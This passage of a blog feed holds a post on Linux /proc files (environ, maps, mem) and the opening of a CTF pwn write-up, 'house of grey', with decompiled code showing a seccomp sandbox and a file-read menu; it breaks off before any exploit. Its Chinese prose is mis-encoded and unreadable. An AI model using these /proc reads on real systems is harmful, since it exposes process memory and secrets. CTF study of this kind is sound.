= <span class="number">0</span></span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>):</span><br><span class="line">            <span class="comment"># print(f&quot;&#123;ans[i]&#125;: &#123;m[ans[i]]&#125;&quot;)</span></span><br><span class="line">            result |= (~(m[ans[i]].as_long()) &amp; <span class="number">1</span>) &lt;&lt; i</span><br><span class="line">        <span class="built_in">print</span>(result.to_bytes(<span class="number">0x10</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        s.add(Or([ans[i] != m[ans[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>)]))</span><br><span class="line"><span class="comment"># ç¬¬äºŒéƒ¨åˆ†åŒç†</span></span><br></pre></td></tr></table></figure>

<p>æœ€åæ‰å‘ç°æ—¢ç„¶éƒ½è¦æ¨¡æ‹Ÿæ‰§è¡Œäº†ä¸ºä»€ä¹ˆä¸ç”¨Angrå‘¢(</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxä¸­çš„è™šæ‹Ÿæ–‡ä»¶</title>
    <url>/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="Linux-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"><a href="#Linux-è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="Linux è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ"></a>Linux è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</h1><p>é™¤äº†å­˜æ”¾åœ¨ç‰©ç†å†…å­˜ä¸­çš„æ–‡ä»¶å¤–Linuxè¿˜æä¾›äº†ä¸€ç³»åˆ—è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ¥è®¿é—®ç³»ç»Ÿèµ„æº å…¶ä¸­<code>/proc</code>å¯ä»¥è®¿é—®ä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰ä¿¡æ¯ å¯ä»¥ç”¨æ¥è¯»å–ä¸€äº›æ•æ„Ÿç¨‹åºä¿¡æ¯ ä½¿ç”¨<code>/proc/&lt;pid&gt;/</code>æ¥è®¿é—®pidæ‰€æŒ‡è¿›ç¨‹çš„èµ„æº è¯¦ç»†ä¿¡æ¯å‚è€ƒ<a href="https://docs.kernel.org/filesystems/proc.html">Linuxå†…æ ¸æ–‡æ¡£</a></p>
<span id="more"></span>

<h2 id="å„ä¸ªå­æ–‡ä»¶"><a href="#å„ä¸ªå­æ–‡ä»¶" class="headerlink" title="å„ä¸ªå­æ–‡ä»¶"></a>å„ä¸ªå­æ–‡ä»¶</h2><table>
<thead>
<tr>
<th align="left">File</th>
<th align="left">Content</th>
</tr>
</thead>
<tbody><tr>
<td align="left">clear_refs</td>
<td align="left">Clears page referenced bits shown in smaps output</td>
</tr>
<tr>
<td align="left">cmdline</td>
<td align="left">Command line arguments</td>
</tr>
<tr>
<td align="left">cpu</td>
<td align="left">Current and last cpu in which it was executed (2.4)(smp)</td>
</tr>
<tr>
<td align="left">cwd</td>
<td align="left">Link to the current working directory</td>
</tr>
<tr>
<td align="left">environ</td>
<td align="left">Values of environment variables</td>
</tr>
<tr>
<td align="left">exe</td>
<td align="left">Link to the executable of this process</td>
</tr>
<tr>
<td align="left">fd</td>
<td align="left">Directory, which contains all file descriptors</td>
</tr>
<tr>
<td align="left">maps</td>
<td align="left">Memory maps to executables and library files (2.4)</td>
</tr>
<tr>
<td align="left">mem</td>
<td align="left">Memory held by this process</td>
</tr>
<tr>
<td align="left">root</td>
<td align="left">Link to the root directory of this process</td>
</tr>
<tr>
<td align="left">stat</td>
<td align="left">Process status</td>
</tr>
<tr>
<td align="left">statm</td>
<td align="left">Process memory status information</td>
</tr>
<tr>
<td align="left">status</td>
<td align="left">Process status in human readable form</td>
</tr>
<tr>
<td align="left">wchan</td>
<td align="left">Present with CONFIG_KALLSYMS&#x3D;y: it shows the kernel function symbol the task is blocked in - or â€œ0â€ if not blocked.</td>
</tr>
<tr>
<td align="left">pagemap</td>
<td align="left">Page table</td>
</tr>
<tr>
<td align="left">stack</td>
<td align="left">Report full stack trace, enable via CONFIG_STACKTRACE</td>
</tr>
<tr>
<td align="left">smaps</td>
<td align="left">An extension based on maps, showing the memory consumption of each mapping and flags associated with it</td>
</tr>
<tr>
<td align="left">smaps_rollup</td>
<td align="left">Accumulated smaps stats for all mappings of the process. This can be derived from smaps, but is faster and more convenient</td>
</tr>
<tr>
<td align="left">numa_maps</td>
<td align="left">An extension based on maps, showing the memory locality and binding policy as well as mem usage (in pages) of each mapping.</td>
</tr>
</tbody></table>
<h3 id="proc-self-cmdline"><a href="#proc-self-cmdline" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;cmdline"></a>&#x2F;proc&#x2F;self&#x2F;cmdline</h3><ul>
<li><p><strong>ä½œç”¨</strong>:å­˜å‚¨è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•° ä»¥ <code>\0</code> ä½œä¸ºåˆ†éš”ç¬¦(ä¸åƒ <code>ps aux</code> é‚£æ ·ä»¥ç©ºæ ¼åˆ†éš”) </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure>

<ul>
<li><p>å¦‚æœå½“å‰è¿›ç¨‹æ˜¯ </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./myprogram arg1 arg2</span><br></pre></td></tr></table></figure>

<p> é‚£ä¹ˆå†…å®¹ç±»ä¼¼:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./myprogramarg1arg2</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ"></a>&#x2F;proc&#x2F;self&#x2F;environ</h3><ul>
<li><p><strong>ä½œç”¨</strong>:å­˜å‚¨è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ æ¯ä¸ªå˜é‡ä»¥ <code>\0</code> ä½œä¸ºåˆ†éš”ç¬¦ </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/environ | <span class="built_in">tr</span> <span class="string">&#x27;\0&#x27;</span> <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹è¾“å‡º:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">USER=root</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-exe"><a href="#proc-self-exe" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;exe"></a>&#x2F;proc&#x2F;self&#x2F;exe</h3><ul>
<li><p><strong>ä½œç”¨</strong>:æŒ‡å‘è¿›ç¨‹å½“å‰æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/self/exe</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹è¾“å‡º:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 0 Mar 3 10:00 /proc/self/exe -&gt; /usr/bin/ls</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>è·å–å¯æ‰§è¡Œè·¯å¾„:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">readlink</span> /proc/self/exe</span><br></pre></td></tr></table></figure>

<ul>
<li><p>è¾“å‡ºç¤ºä¾‹:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/bin/bash</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-fd"><a href="#proc-self-fd" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;fd&#x2F;"></a>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;</h3><ul>
<li><p><strong>ä½œç”¨</strong>:å­˜å‚¨å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦(ç±»ä¼¼ <code>ls -l /proc/self/fd/</code>) </p>
</li>
<li><p>æŸ¥çœ‹æ‰“å¼€çš„æ–‡ä»¶:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/self/fd/</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹è¾“å‡º:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">total 0</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 0 -&gt; /dev/pts/1</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 1 -&gt; /dev/pts/1</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 2 -&gt; /dev/pts/1</span><br><span class="line">lr-x------ 1 user user 64 Mar 3 10:00 3 -&gt; /var/log/syslog</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>0</code> &#x3D; æ ‡å‡†è¾“å…¥(stdin)</p>
</li>
<li><p><code>1</code> &#x3D; æ ‡å‡†è¾“å‡º(stdout)</p>
</li>
<li><p><code>2</code> &#x3D; æ ‡å‡†é”™è¯¯(stderr)</p>
</li>
<li><p><code>3</code> åŠä»¥ä¸Š &#x3D; è¿›ç¨‹æ‰“å¼€çš„å…¶ä»–æ–‡ä»¶</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;maps"></a>&#x2F;proc&#x2F;self&#x2F;maps</h3><ul>
<li><p><strong>ä½œç”¨</strong>:æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„<strong>å†…å­˜æ˜ å°„</strong> åŒ…æ‹¬ä»£ç æ®µã€å †ã€æ ˆã€åŠ¨æ€åº“ç­‰ </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹è¾“å‡º:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">555555554000-555555556000 r-xp 00000000 08:01 123456 /usr/bin/myprogram</span><br><span class="line">555555756000-555555757000 rw-p 00002000 08:01 123456 /usr/bin/myprogram</span><br><span class="line">7ffff7dcf000-7ffff7df1000 r-xp 00000000 08:01 654321 /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0 [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0 [vdso]</span><br><span class="line">7fffffffde000-7ffffffff000 rw-p 00000000 00:00 0 [stack]</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸»è¦æ˜ å°„åŒºåŸŸ:</p>
<ul>
<li><strong>å¯æ‰§è¡Œæ–‡ä»¶ä»£ç æ®µ</strong>(<code>r-xp</code>)</li>
<li><strong>å¯æ‰§è¡Œæ–‡ä»¶æ•°æ®æ®µ</strong>(<code>rw-p</code>)</li>
<li><strong>å…±äº«åº“(å¦‚ libc.so.6)</strong></li>
<li><strong>å †(heap)</strong></li>
<li><strong>æ ˆ(stack)</strong></li>
<li><strong><code>vdso</code>ã€<code>vvar</code> ç­‰ç‰¹æ®Šæ®µ</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;mem"></a>&#x2F;proc&#x2F;self&#x2F;mem</h3><ul>
<li><p><strong>ä½œç”¨</strong>:æ˜ å°„å½“å‰è¿›ç¨‹çš„æ•´ä¸ªå†…å­˜(å¯ç”¨ <code>lseek + read</code> è¯»å–) </p>
</li>
<li><p>ç¤ºä¾‹:è¯»å–ç‰¹å®šåœ°å€:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDONLY);</span><br><span class="line">lseek(fd, (<span class="type">off_t</span>)<span class="number">0x555555554000</span>, SEEK_SET);</span><br><span class="line">read(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>åªèƒ½è¯»å–å·²æ˜ å°„åŒºåŸŸ å¦åˆ™ <code>read()</code> å¤±è´¥</strong></li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-stat"><a href="#proc-self-stat" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;stat"></a>&#x2F;proc&#x2F;self&#x2F;stat</h3><ul>
<li><p><strong>ä½œç”¨</strong>:è¿›ç¨‹çš„è¯¦ç»†çŠ¶æ€ä¿¡æ¯(æ•°å€¼å‹) </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/stat</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹è¾“å‡º:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1234</span> <span class="string">(myprogram)</span> <span class="string">R</span> <span class="number">567</span> <span class="number">567</span> <span class="number">567</span> <span class="number">0</span> <span class="number">-1</span> <span class="number">4194560</span> <span class="number">250</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">20</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">12345678</span> <span class="number">12345678</span> <span class="number">1000 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">18446744073709551615</span> <span class="number">4194304</span> <span class="number">1234 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">17</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¬¬ 1 é¡¹:PID</p>
</li>
<li><p>ç¬¬ 2 é¡¹:è¿›ç¨‹å</p>
</li>
<li><p>ç¬¬ 3 é¡¹:è¿›ç¨‹çŠ¶æ€(<code>R</code> &#x3D; è¿è¡Œ <code>S</code> &#x3D; ç¡çœ )</p>
</li>
<li><p>å…¶ä»–ä¿¡æ¯å¦‚çˆ¶è¿›ç¨‹ PIDã€ä¼˜å…ˆçº§ã€è¿›ç¨‹æ—¶é—´ç­‰</p>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="proc-self-status"><a href="#proc-self-status" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;status"></a>&#x2F;proc&#x2F;self&#x2F;status</h3><ul>
<li><p><strong>ä½œç”¨</strong>:ä¸ <code>stat</code> ç±»ä¼¼ ä½†æ›´å¯è¯» </p>
</li>
<li><p>æŸ¥çœ‹æ–¹å¼:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/status</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ç¤ºä¾‹:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Name:   <span class="built_in">cat</span></span><br><span class="line">Umask:  0022</span><br><span class="line">State:  R (running)</span><br><span class="line">Tgid:   107428</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    107428</span><br><span class="line">PPid:   64836</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    1000    1000    1000    1000</span><br><span class="line">Gid:    1000    1000    1000    1000</span><br><span class="line">FDSize: 64</span><br><span class="line">Groups: 4 20 24 25 27 29 30 44 46 100 101 113 116 129 136 1000 </span><br><span class="line">NStgid: 107428</span><br><span class="line">NSpid:  107428</span><br><span class="line">NSpgid: 107428</span><br><span class="line">NSsid:  64836</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>åŒ…å«è¿›ç¨‹åç§°ã€çŠ¶æ€ã€PIDã€å†…å­˜å ç”¨ã€çº¿ç¨‹æ•°ç­‰ä¿¡æ¯</p>
</li>
</ul>
</li>
</ul>
<h2 id="åº”ç”¨ä¸¾ä¾‹"><a href="#åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹"></a>åº”ç”¨ä¸¾ä¾‹</h2><h3 id="æ”»é˜²ä¸–ç•Œ-house-of-grey"><a href="#æ”»é˜²ä¸–ç•Œ-house-of-grey" class="headerlink" title="[æ”»é˜²ä¸–ç•Œ] house of grey"></a>[æ”»é˜²ä¸–ç•Œ] house of grey</h3><p>ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 random; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my house! Enjoy yourself!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to help me build my room? Y/n?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;random, <span class="number">8uLL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    random &amp;= <span class="number">0xFFFFF0</span>u;</span><br><span class="line">    v8 = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x10000000</span>uLL, <span class="number">3</span>, <span class="number">131106</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = clone(fn, &amp;v8[random], <span class="number">256</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pid == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0x80000000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nMaybe something wrong? Build failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nBuild finished! Thanks a lot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆå§‹åŒ–å‡½æ•°ä¸­è®¾ç½®äº†å‡ ä¸ªæ²™ç®±è§„åˆ™ <code>seccomp-tools</code>åæ±‡ç¼–çœ‹ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-112705.png" alt="image-20250303112646766"></p>
<p>ç¦æ‰äº†<code>execve</code> æ„å‘³ç€ä¸»çº¿ç¨‹ä¸å¯èƒ½get shell</p>
<p>å›åˆ°ä¸»å‡½æ•° mmapäº†ä¸€å— 0x10000000 bytes çš„ç©ºé—´ ç„¶åä»éšæœºæ•°å‘ç”Ÿå™¨ä¸­è¯»å–ä¸€ä¸ª0x10å¯¹é½çš„éšæœºæ•°ä½œä¸ºå°†<code>fn()</code>æ˜ å°„åˆ°mmapå‡ºæ¥çš„ç©ºé—´åä½¿ç”¨çš„æ ˆåœ°å€ ç„¶åå¯ç”¨å­çº¿ç¨‹æ‰§è¡Œ<code>fn()</code></p>
<p>ä¸»çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°åŸºæœ¬å¯ä»¥æ’é™¤æ³„éœ²flagçš„å¯èƒ½ åªæœ‰4å­—èŠ‚çš„è¾“å…¥å¹¶ä¸”é€šè¿‡<code>exit()</code>é€€å‡º æ¥ä¸‹æ¥çœ‹çœ‹fn:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n1.Find something  2.Locate yourself  3.Get something  4.Give something  5.Exit&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">fn</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 offset; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get into my room. Just find something!\n&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x186A0</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( setbpf() )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v8 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So man, what are you finding?&quot;</span>);</span><br><span class="line">        buf[(<span class="type">int</span>)(read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL) - <span class="number">1</span>)] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( check(buf) )    <span class="comment">//include &#x27;flag&#x27; or &#x27;*&#x27;</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Man, don&#x27;t do it! See you^.&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fd = open(buf, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So, Where are you?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x20</span>uLL);</span><br><span class="line">        offset = strtoull(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        lseek(fd, offset, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How many things do you want to get?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">        v3 = atoi(nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v3 &lt;= <span class="number">100000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = read(fd, v8, v3);</span><br><span class="line">          <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error read&quot;</span>);</span><br><span class="line">            perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You get something:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, v8, v4);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;You greedy man!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want to give me?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nI guess you don&#x27;t want to say Goodbye!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But sadly, bye! Hope you come again!\n&quot;</span>);</span><br><span 